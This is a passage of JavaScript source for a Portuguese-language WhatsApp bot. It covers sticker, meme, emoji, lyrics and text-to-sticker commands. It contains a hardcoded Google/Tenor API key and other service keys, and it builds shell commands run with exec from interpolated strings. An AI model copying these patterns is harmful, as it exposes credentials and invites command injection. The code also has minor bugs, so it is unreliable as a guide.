atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
    let dwnld = await quoted.download()
    let { floNime } = require('./funções/uploader')
    let fatGans = await floNime(dwnld)
    let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
    let FaTiH = await nezuko.sendImageAsSticker(from, smeme, m, { packname: global.packname, author: global.auhor })
    await fs.unlinkSync(FaTiH)
}
   break
  
case 'legenda': {
    if (!/image/.test(mime)) return reply( `Enviar/responder imagem/adesivo com legenda ${prefix + command} |text2`)
if (!text) return reply( `Enviar/responder imagem/adesivo com legenda ${prefix + command} |text2`)
    nezuko.sendMessage(from, { react: { text: `👋`, key: m.key }})      
    atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
    let dwnld = await quoted.download()
    let { floNime } = require('./funções/uploader')
    let fatGans = await floNime(dwnld)
    let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
    let FaTiH = await nezuko.sendImageAsSticker(from, smeme, m, { packname: global.packname, author: global.auhor })
    await fs.unlinkSync(FaTiH)
}
   break
   
//========FINAL DAS LEGENDAS=============
   

//=============STICKER============
  
case 'figfundo':
case 'figvideo':
case 'figusemfundo': 
case 'sfundo':  
if(!isQuotedImage) return reply(`Marque uma imagem`)
if ((isMedia && !info.message.videoMessage || isQuotedImage) && args.length == 0) {
manu = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
reply(enviar.espere)
buff = await getFileBuffer(manu, 'image')
bas64 = `data:image/jpeg;base64,${buff.toString('base64')}`
anu = args.join(' ').split('|')
satu = anu[0] !== '' ? anu[0] : `${pushname}`
sd = `📍Criado por↓𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`
dua = typeof anu[1] !== 'undefined' ? anu[1] : `${sd}`
var mantap = await convertSticker(bas64, `${dua}`, `${satu}`)
var sti = new Buffer.from(mantap, 'base64');
nezuko.sendMessage(from, {sticker: sti}, {quoted: info})
} else {
return reply(`So imagem mn -_-`)
}
break

case 'sc':
case 'c':  
case 'csticker':  
case 'cstiker':  
case 'stcirculo':
case 'circlesticker':  
if ((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat( [ base64, send ] ) }
reply(enviar.espere)
link = await upload(base64)
ranp = getRandom('.gif')
rano = getRandom('.webp')
ini_buffer = `https://api-exteam.herokuapp.com/api/circle?img=${link}`
exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 320:320 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply(`DEU ERROR 😞`)
buff = fs.readFileSync(rano)
nezuko.sendMessage(from, {sticker: buff}, { quoted: info})
fs.unlinkSync(rano)
})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')
}
break

case 'sticker': case 's': case 'stickergif': case 'sgif': case 'figu': case 'st': case 'stk': {
(async function () {
var legenda = q ? q?.split("/")[0] : `[🤖] 𝗦𝗢𝗟𝗜𝗖𝗜𝗧𝗔𝗗𝗢 𝗣𝗢𝗥:
[🚀] 𝗕𝗢𝗧:
[👥] 𝗗𝗢𝗡𝗢:`
var autor = q ? q?.split("/")[1] : q?.split("/")[0] ? '' : `${pushname}
Lorde Bot MD
${NickDono}`
if (isMedia && !info.message.videoMessage || isQuotedImage) {
var encmedia = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'image')
fs.writeFileSync(rane, buffimg)
rano = getRandom('.webp')
exec(`ffmpeg -i ${rane} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(rane)
// "android-app-store-link": "https://play.google.com/store/search?q=%2B55%2094%209147-2796%20%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5&c=apps",
var json = {
"sticker-pack-name": legenda,
"sticker-pack-publisher": autor
}
var exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
var jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
var exif = Buffer.concat([exifAttr, jsonBuff])
exif.writeUIntLE(jsonBuff.length, 14, 4)
let nomemeta = Math.floor(Math.random() * (99999 - 11111 + 1) + 11111)+".temp.exif"
fs.writeFileSync(`./${nomemeta}`, exif) 
exec(`webpmux -set exif ${nomemeta} ${rano} -o ${rano}`, () => {
nezuko.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: info})
fs.unlinkSync(nomemeta)
fs.unlinkSync(rano)
})
})
} else if (isMedia && info.message.videoMessage.seconds < 11 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 35) {
var encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
rano = getRandom('.webp')
await ffmpeg(`./${rane}`)
.inputFormat(rane.split('.')[1])
exec(`ffmpeg -i ${rane} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(rane)
let json = {
"sticker-pack-name": legenda,
"sticker-pack-publisher": autor
}
let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
let jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
let exif = Buffer.concat([exifAttr, jsonBuff])
exif.writeUIntLE(jsonBuff.length, 14, 4)
let nomemeta = "temp.exif"
fs.writeFileSync(`./${nomemeta}`, exif) 
exec(`webpmux -set exif ${nomemeta} ${rano} -o ${rano}`, () => {
nezuko.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: info})
fs.unlinkSync(nomemeta)
fs.unlinkSync(rano)
})
})
} else {
reply(`Você precisa enviar ou marcar uma imagem ou vídeo com no máximo 10 segundos`)
}
})().catch(e => {
console.log(e)
reply("Hmm deu erro")
try {
if (fs.existsSync("temp.exif")) fs.unlinkSync("temp.exif");
if (fs.existsSync(rano)) fs.unlinkSync(rano);
if (fs.existsSync(media)) fs.unlinkSync(media);
} catch {}
})
}
break
   
case 'f':   
case 'f': {

if (/image/.test(mime)) {
media = await quoted.download()
let encmedia = await nezuko.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.packname2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 40) return reply('Máximo 40 segundo!')
media = await quoted.download()
let encmedia = await nezuko.sendVideoAsSticker(from, media, m,  { packname: global.packname, author: global.packname2 })
await fs.unlinkSync(encmedia)
} else {
reply(`Enviar imagem/vídeo com legenda ${prefix + command}\nDuração Video 1/40 segundo`)
}
}
break

case 'nomefig':
if(!isPremium) return reply(enviar.msg.premium)
if(!q) return reply(`Use assim: ${prefix+command} Criada por/bla`)
var nomefig = JSON.parse(fs.readFileSync('./datab/usuarios/figurinhas.json'))
nomefig[sender] = {legenda: `${q?.split(`/`)[0]}`,autor: `${q?.split(`/`)[1]}`}
fs.writeFileSync('./datab/usuarios/figurinhas.json', JSON.stringify(nomefig, null, 2))
reply(`Sucesso, agora suas figurinhas serão feitas com a sua descrição`)
break

case 'roubarfigu':
if(!isPremium && !SoDono) return reply(enviar.msg.premium)
if (!isQuotedSticker) return reply('Marque uma figurinha...')
var nomefig = JSON.parse(fs.readFileSync('./datab/usuarios/figurinhas.json'))
if(nomefig[sender] && !q) {
var { autor, legenda } = nomefig[sender]
} else {
var legenda = q ? q?.split("/")[0] : ``
var autor = q ? q?.split("/")[1] : ``
}
await nezuko.sendMessage(from, {
  sticker: await addExif(await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker'), legenda, autor)
}, {quoted: info})
break

case 'figurinhas22':
try {
if(!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 7`)
if(q >= 100) return reply("Coloque abaixo de 100...")
reply(`AMOR TO ENVIANDO EM SEU PV`)
async function figus() {
bala = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
bass64 = `data:image/jpeg;base64,${bala.toString('base64')}`
mantap = await convertSticker(bass64, sender.split("@")[0], `${NomeDoBot}`)
imageBuffer = new Buffer.from(mantap, 'base64');
nezuko.sendMessage(sender, {sticker: imageBuffer})
}
for ( i = 0; i < q; i++) {
await sleep(2000)
figus()
}
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar") 
} else {
reply('ERROR!!')
}
}
break

case 'figs': case 'figus': case 'figurinha': case 'figurinhas': {

sections = [
{
title: "[☔] ◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸 >3 [☔] ",
rows: [
{title: "[☔] 1 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀 [☔]", rowId: `${prefix}figurinhas22 1`},
{title: "[☔] 2 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 2`},
{title: "[☔] 3 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 3`},
{title: "[☔] 4 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 4`},
{title: "[☔] 5 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 5`},
{title: "[☔] 6 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 6`},
{title: "[☔] 7 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 7`},
{title: "[☔] 8 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 8`},
{title: "[☔] 9 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 9`},
{title: "[☔] 1 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 10`},
{title: "[☔] 11 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 11`},
{title: "[☔] 12 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 12`},
{title: "[☔] 13 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 13`},
{title: "[☔] 14 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 14`},
{title: "[☔] 15 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 15`},
{title: "[☔] 16 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 16`},
{title: "[☔] 17 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 17`},
{title: "[☔] 18 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 18`},
{title: "[☔] 19 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 19`},
{title: "[☔] 20 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 [☔]", rowId: `${prefix}figurinhas22 20`}


]
},
]
 

const listMessage2 = {
text: `

𝐎𝐥𝐚́  ${pushname} 

𝐄𝐬𝐜𝐨𝐥𝐡𝐚 𝐀 𝐐𝐮𝐚𝐧𝐭𝐢𝐝𝐚𝐝𝐞 𝐃𝐞 𝐅𝐢𝐠𝐮𝐫𝐢𝐧𝐡𝐚𝐬 
`,
footer: `〘 ${NomeDoBot} 〙`,
title: ``,
buttonText: "𝐐𝐮𝐚𝐧𝐭𝐢𝐝𝐚𝐝𝐞",
sections
}
nezuko.sendMessage(from, listMessage2, {quoted: dnselo})
}
break

case 'semoji':
if (!q) return reply('Qual emoji?')
  var sections = [
    {
	title: "Emojis:",
	rows: [ 
    { title: `Emoji "${q}" da Apple.`, rowId: `${prefix + 'emooji' + ' ' + q + '/' + 'apple'}` },
   	{ title: `Emoji "${q}" do Google.`, rowId: `${prefix + 'emooji' + ' ' + q + '/' + 'google'}` },
	{ title: `Emoji "${q}" da Samsung.`, rowId: `${prefix + 'emooji' + ' ' + q + '/' + 'samsung'}` },
	{ title: `Emoji "${q}" da Microsoft.`, rowId: `${prefix + 'emooji' + ' ' + q + '/' + 'microsoft'}` },
	{ title: `Emoji "${q}" do Whatsapp.`, rowId: `${prefix + 'emooji' + ' ' + q + '/' + 'whatsapp'}` },
	{ title: `Emoji "${q}" do Twitter.`, rowId: `${prefix + 'emooji' + ' ' + q + '/' + 'twitter'}` },
	{ title: `Emoji "${q}" do Facebook.`, rowId: `${prefix + 'emooji' + ' ' + q + '/' + 'facebook'}` },
	{ title: `Emoji "${q}" do Joypixels.`, rowId: `${prefix + 'emooji' + ' ' + q + '/' + 'joypixels'}` },
	{ title: `Emoji "${q}" do Openmoji.`, rowId: `${prefix + 'emooji' + ' ' + q + '/' + 'openmoji'}` },
	{ title: `Emoji "${q}" do Skype(Emoji Animado).`, rowId: `${prefix + 'emooji' + ' ' + q + '/' + 'skype'}` },
	{ title: `Emoji "${q}" do Emojidex.`, rowId: `${prefix + 'emooji' + ' ' + q + '/' + 'emojidex'}` },
	{ title: `Emoji "${q}" do Emojipedia.`, rowId: `${prefix + 'emooji' + ' ' + q + '/' + 'Emojipedia'}` },
	{ title: `Emoji "${q}" do LG.`, rowId: `${prefix + 'emooji' + ' ' + q + '/' + 'lg'}` },
	{ title: `Emoji "${q}" do Noto Emoji.`, rowId: `${prefix + 'emooji' + ' ' + q + '/' + 'notoemoji'}` } ], 
     }
]
 var listMessage = {
  text: "Escolha um tema de figurinha.",
  footer: "Selecione o tema abaixo.",
  buttonText: "Escolha o tema da sua Figurinha.",
  sections
}
const sendemoji = await nezuko.sendMessage(from, listMessage, {quoted: dnselo})
break

case 'emooji':
if(!q) return reply(`Exemplo: ${prefix}emoji ☹️/whatsapp`)
emot = q.split('/')[0]
jemot = q.split('/')[1]
if(jemot == 'apple'){
idemot = 0
}
else if(jemot == 'google'){
idemot = 1
}
else if(jemot == 'samsung'){
idemot = 2
}
else if(jemot == 'microsoft'){
idemot = 3
}
else if(jemot == 'whatsapp'){
idemot = 4
}
else if(jemot == 'twitter'){
idemot = 5
}
else if(jemot == 'facebook'){
idemot = 6
}
else if(jemot == 'skype'){
idemot = 7
}
else if(jemot == 'joypixels'){
idemot = 8
}
else if(jemot == 'openmoji'){
idemot = 9
}
else if(jemot == 'notoemoji'){
idemot = 10
}
else if(jemot == 'Emojipedia'){
idemot = 11
}
else if(jemot == 'lg'){
idemot = 12
}
else{
return reply(`....`)
}
reply('Aguarde...')
if(idemot == undefined) return
emoji.get(emot)
.then(emoji => {
console.log(emoji.images[idemot]);
sendStickerFromUrl(from, emoji.images[idemot].url, dnselo)
})
break

case 'letra':
try {
if (!q) return reply(` e o nome da música? Exemplo: ${prefix + command} the perfect girl `)
p = await fetchJson(`https://api.brizaloka-api.tk/ia/lyricsfinder?apikey=brizaloka&query=${q}`, {method: 'get'})
ll = `${p.lyrics}`  
reply(`
👨‍💻Nome ➪ ${q}
⚡Letra ☟︎︎︎☟︎︎︎☟︎︎︎
 -----------------------------
${ll}
 -----------------------------`)
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'letra2':
try {
reply(mess.wait)
teks = body.slice(8)
anu = await fetchJson(`http://api.brizaloka-api.tk/ia/lyricsfinder?apikey=17desetembro&query=${teks}`, {method: 'get'})
reply(`*Nome da música: ${teks}*\n\n${anu.lyrics}*`)
} catch (e) {
    console.log(e)
    reply(`erro!!`)
}
break

case 'emoji': {
if (!args.join(" ")) return reply('Cadê o emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await nezuko.sendMessage(from, {image:{url:emoji.images[4].url}, caption:"PRONTO!"}, {quoted:m})
await nezuko.sendMessage(from, {text:`!s`}, {quoted:mese})
}).catch(e => {
reply("EMOJI NÃO ENCONTRADO, TENTE OUTRO EMOJI AÍ...")
})
}
break

case 'emoji2':     
case 'emoji-mix':
case 'emojimix': {
    if (!q) return reply( `Exemplo : ${prefix + command} 😅+🤔`) 
	reply('SER NÃO FOR TENTA COM OUTRO...?')
			let [emoji1, emoji2] = q.split`+`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
	let encmedia = await nezuko.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
	await fs.unlinkSync(encmedia)
		}
}
break

case 'rename':
case 'roubar':  
if (!isQuotedSticker) return reply('Marque uma figurinha...')
encmediats = await getFileBuffer(m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
var kls = q
var pack = kls.split("/")[0];
var author2 = kls.split("/")[1];
if (!q) return reply('*E o autor e o nome do pacote?*')
if (!pack) return reply(`*por favor escreve o formato certo: ${prefix + command} sad/bla*`)
if (!author2) return reply(`*por favor escreve o formato certo: ${prefix + command} sad/dms*`)
reply(enviar.espere)
bas64 = `data:image/jpeg;base64,${encmediats.toString('base64')}`
var mantap = await convertSticker(bas64, `${author2}`, `${pack}`)
var sti = new Buffer.from(mantap, 'base64');
nezuko.sendMessage(from, {sticker: sti, contextInfo: { externalAdReply:{title: `${pack}|${author2}`,body:"", previewType:"PHOTO",thumbnail: sti}}}, {quoted: dnselo})
.catch((err) => {
reply(`❎ Error, tenta mais tarde`); 
})
break

case'rename2': case 'roubar2': {  
            let text1 = q.split("|")[0]
            let text2 = q.split("|")[1]
              if (!isQuotedSticker) return reply(`Responder a um adesivo com legenda ext|text\n\nExemplo: ${prefix + command} Nezuko|domina`)   
              if (!text1) return reply(`Exemplo! : !roubar Nezuko|domina`)    
              if (!text2) return reply(`Exemplo! : !roubar Nezuko|domina`)
             let buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
             console.log(buff)
             let proc = await writeExifStc(buff, { packname: text1, author: text2 })
             await nezuko.sendMessage(from, { sticker: { url: proc } }, { quoted: dnselo })
             await fs.unlinkSync(proc)
          }
          break

case 'togif':
if (!isQuotedSticker) return reply('*[ ❗ ] Marque a figurinha animada!*')
if ((isMedia && !m.message.videoMessage || isQuotedSticker) && args.length == 0) {
buff = await getFileBuffer(m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
reply('*「 ❗ 」 Aguarde, convertendo a figu em gif...*')
a = await webp_mp4(buff)
mp4 = await getBuffer(a)
nezuko.sendMessage(from, {video: mp4, gifPlayback: true, filename: `stick.gif`}, {quoted: dnselo})
fs.unlinkSync(buff)
}
break

case 'toimg':
if (!isQuotedSticker) return reply('❌ adesivo de resposta um ❌')
reply(enviar.espere)
buff = await getFileBuffer(m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
nezuko.sendMessage(from, {image: buff}, {quoted: dnselo}).catch(e => {
console.log(e);
reply('ERROR!!')
})
break

case 'tomp3':
if ((isMedia && !info.message.imageMessage || isQuotedVideo)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.videoMessage
reply(enviar.espere)
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane 
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => { 
fs.unlinkSync(media)
if (err) return reply('❌ Falha ao converter vídeo para mp3 ❌')
buffer = fs.readFileSync(ran)
nezuko.sendMessage(from, {audio: buffer, mimetype: 'audio/mp4'}, {quoted: info})
fs.unlinkSync(ran)
})
} else {
reply("Marque o vídeo para transformar em áudio por favor..")
}
break

//========FINAL DAS STICKER=============


//==========(TTPS/ATTP/TTM)============\\

case 'exx1':
if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}attp ${pushname} gado`)
reply (`𝐄𝐒𝐓𝐎𝐔 𝐅𝐀𝐙𝐄𝐍𝐃𝐎 𝐒𝐄𝐔 𝐀𝐓𝐓𝐏 🌹`)

uuu = await getBuffer(`https://api.brizaloka-api.tk/ttp/attp1?apikey=brizaloka&text=${encodeURIComponent(body.slice(6))}`)
await nezuko.sendMessage(from, {sticker: uuu}, {quoted: info})
break

case 'exx2':
if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}attp ${pushname} gado`)
reply (`𝐄𝐒𝐓𝐎𝐔 𝐅𝐀𝐙𝐄𝐍𝐃𝐎 𝐒𝐄𝐔 𝐀𝐓𝐓𝐏 🌹`)

uuu = await getBuffer(`https://api.brizaloka-api.tk/ttp/attp2?apikey=brizaloka&text=${encodeURIComponent(body.slice(6))}`)
await nezuko.sendMessage(from, {sticker: uuu}, {quoted: info})
break

case 'exx3':
if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}attp ${pushname} gado`)
reply (`𝐄𝐒𝐓𝐎𝐔 𝐅𝐀𝐙𝐄𝐍𝐃𝐎 𝐒𝐄𝐔 𝐀𝐓𝐓𝐏 🌹`)

uuu = await getBuffer(`https://api.brizaloka-api.tk/ttp/attp3?apikey=brizaloka&text=${encodeURIComponent(body.slice(6))}`)
await nezuko.sendMessage(from, {sticker: uuu}, {quoted: info})
break

case 'exx4':
if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}attp ${pushname} gado`)
reply (`𝐄𝐒𝐓𝐎𝐔 𝐅𝐀𝐙𝐄𝐍𝐃𝐎 𝐒𝐄𝐔 𝐀𝐓𝐓𝐏 🌹`)

uuu = await getBuffer(`https://api.brizaloka-api.tk/ttp/attp4?apikey=brizaloka&text=${encodeURIComponent(body.slice(6))}`)
await nezuko.sendMessage(from, {sticker: uuu}, {quoted: info})
break

case 'exx5':
if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}attp ${pushname} gado`)
reply (`𝐄𝐒𝐓𝐎𝐔 𝐅𝐀𝐙𝐄𝐍𝐃𝐎 𝐒𝐄𝐔 𝐀𝐓𝐓𝐏 🌹`)

uuu = await getBuffer(`https://api.brizaloka-api.tk/ttp/attp5?apikey=brizaloka&text=${encodeURIComponent(body.slice(6))}`)
await nezuko.sendMessage(from, {sticker: uuu}, {quoted: info})
break

case 'exx6':
if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}attp ${pushname} gado`)
reply (`𝐄𝐒𝐓𝐎𝐔 𝐅𝐀𝐙𝐄𝐍𝐃𝐎 𝐒𝐄𝐔 𝐀𝐓𝐓𝐏 🌹`)

uuu = await getBuffer(`https://api.brizaloka-api.tk/ttp/attp6?apikey=brizaloka&text=${encodeURIComponent(body.slice(6))}`)
await nezuko.sendMessage(from, {sticker: uuu}, {quoted: info})
break

case 'ttp':
try {
enviarbutao(from,`Fazendo ttp...`,`${NomeDoBot}`,
[{index: 5, quickReplyButton: {displayText: '[🌹] obrigado [🌹]', id: ``}}], info)

string = args.join(' ') || 'Texto indefinido'
post = `https://api.brizaloka-api.tk/ttp/ttp1?apikey=brizaloka&text=${string}`
sendStickerFromUrl(from, {sticker: post}, {quoted: info})
} catch {
reply('ERROR!!')
}
break

//==============================================================================\\


case 'attp':
 sections = [
    {
	title: `🌹 ${NomeDoBot}`,
	rows: [
	    {title: "[🌹] 𝙀𝙨𝙩𝙞𝙡𝙤 1 [🌹] ", rowId: `${prefix}exx1 ${q}`},
	    {title: "[🌹] 𝙀𝙨𝙩𝙞𝙡𝙤 2 [🌹] ", rowId: `${prefix}exx2 ${q}`},	    
	    {title: "[🌹] 𝙀𝙨𝙩𝙞𝙡𝙤 3 [🌹] ", rowId: `${prefix}exx3 ${q}`},
	    {title: "[🌹] 𝙀𝙨𝙩𝙞𝙡𝙤 4 [🌹] ", rowId: `${prefix}exx4 ${q}`},
	    {title: "[🌹] 𝙀𝙨𝙩𝙞𝙡𝙤 5 [🌹] ", rowId: `${prefix}exx5 ${q}`},
	    {title: "[🌹] 𝙀𝙨𝙩𝙞𝙡𝙤 6 [🌹] ", rowId: `${prefix}exx6 ${q}`}
	    	]
    },
]
 
listMessage = {
  text: `Resultados Para [  ${q}  ]`,
  footer: "",
  title: "Estilos de Attp's",
  buttonText: " 🌹 ESCOLHER 🌹 ",
  sections
}
nezuko.sendMessage(from, listMessage, {quoted: info})
break

//======================================\\

case 'packstickers':
case 'carrinhofig':
sections = [
{title: "🇫 🇮 🇬 🇺 🇷 🇮 🇳 🇭 🇦 🇸",
rows: [
{title: "[😆] 𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐃𝐄 𝐌𝐄𝐌𝐄𝐒", rowId: `${prefix}figmeme`},
{title: "[🎎] 𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐃𝐄 𝐀𝐍𝐈𝐌𝐄𝐒", rowId: `${prefix}fig-anime`},
{title: "[📺] 𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐃𝐄 𝐃𝐄𝐒𝐄𝐍𝐇𝐎𝐒", rowId: `${prefix}fig-desenho`},
{title: "[🇰🇷] 𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐃𝐀 𝐂𝐎𝐑𝐄𝐀𝐍𝐀", rowId: `${prefix}fig-coreana`},
{title: "[🤪] 𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐃𝐄 𝐄𝐌𝐎𝐉𝐈𝐒", rowId: `${prefix}fig-emoji`},
{title: "[🤬] 𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐃𝐄 𝐑𝐀𝐈𝐕𝐀", rowId: `${prefix}fig-raiva`},
{title: "[🤣] 𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐄𝐍𝐆𝐑𝐀𝐂𝐀𝐃𝐎𝐒", rowId: `${prefix}figuengracado`}
]
}]
sendlistA(from, "© _Copyright by NEZUKO-MD_", "", "[🛒] 𝐂𝐀𝐑𝐑𝐈𝐍𝐇𝐎 𝐃𝐄 𝐅𝐈𝐆𝐔 [🛒]", "🔍 𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑: 🔍", sections)
break

case 'fig-meme':
case 'figmeme':
case 'fig-memes':
case 'figumeme':
const memez = `${Math.floor(Math.random() * 130)}`
const memep = `${Math.floor(Math.random() * 130)}`
const memei = `${Math.floor(Math.random() * 130)}`
const memex = `${Math.floor(Math.random() * 130)}`

popopoc = fs.readFileSync(`./FIGURINHAS/Figurinha-meme/${memez}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/Figurinha-meme/${memep}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/Figurinha-meme/${memei}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/Figurinha-meme/${memex}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

setTimeout(() =>{ nezuko.sendMessage(from, {text: 'Olá, você deseja mais *figurinhas*? Clique na opção abaixo e aguarde um pouco.', footer: `© _Copyright by NEZUKO-MD_`, buttons: [{buttonId: `${prefix}fig-meme`, buttonText: {displayText: '『🦄 Mais Figurinhas 💜』'}, type: 1}]}, {quoted: dnselo}) }, 2090)
break

case 'figudesenho':
case 'fig-desenho':
case 'fig-desenhos':
const desenhoa = `${Math.floor(Math.random() * 102)}`
const desenhoe = `${Math.floor(Math.random() * 102)}`
